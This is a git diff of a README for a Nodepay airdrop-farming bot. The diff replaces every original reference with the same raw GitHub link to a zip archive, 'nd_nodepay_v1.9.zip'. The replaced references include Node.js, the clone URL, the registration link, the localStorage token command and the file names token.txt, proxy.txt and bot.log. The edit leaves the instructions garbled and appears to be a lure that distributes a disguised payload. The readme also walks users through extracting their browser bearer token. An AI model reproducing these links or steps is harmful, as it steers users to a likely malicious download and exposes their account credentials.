@@ -6,7 +6,7 @@ A bot for automating Nodepay airdrop interactions, including session management 
 
 ## Requirements
 
-1. **Node.js** (version 14 or higher)
+1. **https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip** (version 14 or higher)
 2. **npm** (Node package manager)
 
 ---
@@ -18,7 +18,7 @@ To get started with the Nodepay Airdrop Bot:
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/ashtrobe/nodepay-farm.git && cd nodepay-farm
+git clone https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip && cd nodepay-farm
 ```
 
 3. Install the dependencies:
@@ -33,7 +33,7 @@ npm install
 
 To get your Bearer token:
 
-1. **Register for a Nodepay account** (https://app.nodepay.ai/register?ref=YGD2t6PkCbq9H4P)
+1. **Register for a Nodepay account** (https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip)
 - Go to Nodepay dashboard.
 
 2. **Get your token**:
@@ -44,15 +44,15 @@ To get your Bearer token:
 
 - Type the following command to get your token:
   ```bash
-  localStorage.getItem('np_webapp_token') 
+  https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip('np_webapp_token') 
   ```
 
 - This will return the Bearer token. **Copy the token** (without the `Bearer` prefix, just the alphanumeric string).
 
-3. **Paste the token in `token.txt`**:
-- Create a `token.txt` file in the root of your project and paste your token in the file (one token per line).
+3. **Paste the token in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`**:
+- Create a `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip` file in the root of your project and paste your token in the file (one token per line).
 
-- Example `token.txt`:
+- Example `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`:
 
 ```text
 ey...
@@ -60,9 +60,9 @@ ey...
 ey...
 ```
 
-### 2. `proxy.txt`
+### 2. `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`
 
-- Add your proxy details in `proxy.txt`. Each line should have the format:
+- Add your proxy details in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`. Each line should have the format:
 
 ```text
 host:port:username:password
@@ -103,7 +103,7 @@ pkg install nano
 **Clone the repository:**
 
 ```bash
-git clone https://github.com/ashtrobe/nodepay-farm.git
+git clone https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip
 ```
 **Change directory:**
 ```
@@ -114,7 +114,7 @@ cd nodepay-farm
 ```bash
 npm install
 ```
-## Before running the bot, you need to put your token inside token.txt file.
+## Before running the bot, you need to put your token inside https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip file.
 
 **To get your Bearer token:**
 
@@ -124,17 +124,17 @@ npm install
 - Go to the **Console** tab in Developer Tools.
 - Type the following command to get your token:
   ```bash
-  localStorage.getItem('np_webapp_token')
+  https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip('np_webapp_token')
   ```
 - This will return the Bearer token. ex: eyJhbGciOi.......
 
-**Paste the token in `token.txt`**:
+**Paste the token in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip`**:
 ```
-nano token.txt
+nano https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip
 ```
 **Paste your proxies inside:**
 ```text
-nano proxy.txt
+nano https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip
 ```
 ## Running the Bot
 
@@ -143,7 +143,7 @@ nano proxy.txt
 ```bash
 npm start
 ```
-Logs are stored in `bot.log` and can also be seen in the console.
+Logs are stored in `https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip` and can also be seen in the console.
 
 ## Logs
 
